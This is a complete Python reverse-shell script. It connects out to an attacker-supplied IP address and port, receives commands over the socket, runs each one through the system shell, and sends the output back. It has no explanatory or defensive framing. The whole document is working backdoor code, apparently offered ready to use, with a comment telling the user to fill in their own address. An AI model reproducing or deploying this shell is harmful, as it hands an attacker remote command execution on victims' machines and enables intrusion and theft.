import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_IP_ADDRESS", YOUR_PORT_NUMBER)) # Replace with your desired IP address and port number
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        result = output.stdout.read() + output.stderr.read()
        s.send(result)
    s.close()

connect()